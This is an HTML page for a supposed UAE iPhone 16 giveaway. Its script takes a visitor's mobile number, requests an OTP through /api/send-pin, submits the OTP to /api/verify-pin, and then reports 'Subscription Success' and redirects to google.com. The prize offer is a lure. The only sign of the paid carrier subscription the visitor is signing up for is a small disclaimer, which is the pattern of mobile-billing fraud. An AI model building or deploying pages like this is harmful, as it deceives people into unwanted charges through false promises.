<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>

<title>Win Big UAE</title>

<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:'Cairo',sans-serif;
}

body{

    background:
    linear-gradient(
    180deg,
    #12002f 0%,
    #1d004d 50%,
    #2d006f 100%
    );

    min-height:100vh;

    color:white;

    overflow-x:hidden;
}

.container{

    width:100%;
    max-width:480px;

    margin:auto;

    padding:20px;

    text-align:center;
}

.top-badge{

    background:#ffde59;

    color:black;

    display:inline-block;

    padding:10px 25px;

    border-radius:999px;

    font-size:18px;

    font-weight:900;

    margin-top:20px;

    animation:pulse 1.5s infinite;
}

@keyframes pulse{

    0%{
        transform:scale(1);
    }

    50%{
        transform:scale(1.05);
    }

    100%{
        transform:scale(1);
    }
}

h1{

    font-size:52px;

    line-height:1.1;

    margin-top:30px;

    font-weight:900;
}

.highlight{

    color:#ffde59;
}

.sub{

    margin-top:20px;

    font-size:24px;

    color:#ddd;
}

.prize-box{

    display:flex;

    gap:15px;

    margin-top:35px;

    justify-content:center;
}

.prize{

    flex:1;

    background:
    linear-gradient(
    135deg,
    #5b21b6,
    #7c3aed
    );

    border:3px solid #ffde59;

    border-radius:20px;

    padding:20px 10px;

    font-size:26px;

    font-weight:900;

    box-shadow:
    0 0 25px rgba(255,222,89,.4);
}

.spin-box{

    margin-top:40px;

    background:white;

    border-radius:28px;

    padding:30px 20px;

    box-shadow:
    0 0 40px rgba(0,0,0,.4);
}

.phone-box{

    display:flex;

    width:100%;

    background:#f3f4f6;

    border-radius:18px;

    overflow:hidden;

    margin-bottom:20px;

    border:2px solid #ddd;
}

.prefix{

    width:95px;

    background:#e5e7eb;

    color:black;

    display:flex;

    align-items:center;

    justify-content:center;

    font-size:28px;

    font-weight:900;
}

.phone-box input{

    flex:1;

    border:none;

    outline:none;

    padding:22px;

    font-size:28px;

    color:black;
}

.claim-btn{

    width:100%;

    border:none;

    background:
    linear-gradient(
    90deg,
    #ffde59,
    #ffd000
    );

    color:black;

    font-size:34px;

    font-weight:900;

    padding:22px;

    border-radius:18px;

    cursor:pointer;

    transition:.2s;

    box-shadow:
    0 10px 30px rgba(255,222,89,.4);
}

.claim-btn:hover{

    transform:scale(1.02);
}

#loading{

    display:none;

    margin-top:20px;

    color:#7c3aed;

    font-size:22px;

    font-weight:bold;
}

#otpBox{

    display:none;

    margin-top:25px;
}

#otp{

    width:100%;

    padding:20px;

    border-radius:18px;

    border:2px solid #ddd;

    font-size:28px;

    margin-bottom:15px;

    text-align:center;
}

.verify-btn{

    width:100%;

    border:none;

    background:
    linear-gradient(
    90deg,
    #7c3aed,
    #9333ea
    );

    color:white;

    font-size:30px;

    font-weight:900;

    padding:20px;

    border-radius:18px;

    cursor:pointer;
}

.disclaimer{

    margin-top:30px;

    font-size:14px;

    color:#ccc;

    line-height:1.6;
}

.flash{

    margin-top:18px;

    color:#ffde59;

    font-size:18px;

    font-weight:bold;

    animation:blink 1s infinite;
}

@keyframes blink{

    0%{
        opacity:1;
    }

    50%{
        opacity:.4;
    }

    100%{
        opacity:1;
    }
}

</style>
</head>
<body>

<div class="container">

<div class="top-badge">
🇦🇪 UAE EXCLUSIVE GIVEAWAY
</div>

<h1>
WIN AN <span class="highlight">iPHONE 16</span>
</h1>

<div class="sub">
Enter your mobile number to participate now
</div>

<div class="prize-box">

<div class="prize">
iPhone 16
</div>

<div class="prize">
AED 10K
</div>

<div class="prize">
AirPods
</div>

</div>

<div class="spin-box">

<div class="phone-box">

<div class="prefix">
+971
</div>

<input
id="msisdn"
placeholder="564975091"
maxlength="9"
inputmode="numeric"
pattern="[0-9]*"
oninput="this.value=this.value.replace(/[^0-9]/g,'')"
/>

</div>

<button class="claim-btn" onclick="sendPIN()">
CLAIM NOW
</button>

<div id="loading">
Processing...
</div>

<div class="flash">
⚡ Only limited winners selected daily
</div>

<div id="otpBox">

<input
id="otp"
placeholder="Enter OTP"
/>

<button class="verify-btn" onclick="verifyOTP()">
VERIFY OTP
</button>

</div>

</div>

<div class="disclaimer">

By continuing, you agree to receive promotional subscription services.
Standard carrier charges may apply.

</div>

</div>

<script>

let savedTxid = '';

async function sendPIN(){

    let msisdn =
    document.getElementById('msisdn').value;

    msisdn = msisdn.replace(/\s/g,'');

    msisdn = msisdn.replace('+','');

    if(msisdn.startsWith('0')){

        msisdn =
        '971' + msisdn.substring(1);

    }

    else if(!msisdn.startsWith('971')){

        msisdn =
        '971' + msisdn;

    }

    if(msisdn.length < 12){

        alert('Please enter valid UAE number');
        return;

    }

    document
    .getElementById('loading')
    .style.display='block';

    try{

        const response =
        await fetch('/api/send-pin',{

            method:'POST',

            headers:{
                'Content-Type':'application/json'
            },

            body:JSON.stringify({
                msisdn:msisdn
            })

        });

        const data =
        await response.json();

        console.log(data);

        document
        .getElementById('loading')
        .style.display='none';

        if(data.txid){

            savedTxid = data.txid;

            document
            .getElementById('otpBox')
            .style.display='block';

            alert('OTP Sent Successfully');

        }else{

            alert(data.msg || 'Failed');

        }

    }catch(err){

        console.log(err);

        document
        .getElementById('loading')
        .style.display='none';

        alert('Server Error');

    }

}

async function verifyOTP(){

    const otp =
    document.getElementById('otp').value;

    if(!otp){

        alert('Enter OTP');
        return;

    }

    try{

        const response =
        await fetch('/api/verify-pin',{

            method:'POST',

            headers:{
                'Content-Type':'application/json'
            },

            body:JSON.stringify({

                txid:savedTxid,
                pin:otp

            })

        });

        const data =
        await response.json();

        console.log(data);

        if(data.stateCode == 0){

            alert('Subscription Success');

            window.location.href =
            'https://google.com';

        }else{

            alert(data.msg || 'OTP Failed');

        }

    }catch(err){

        console.log(err);

        alert('Verify Error');

    }

}

</script>

</body>
</html>
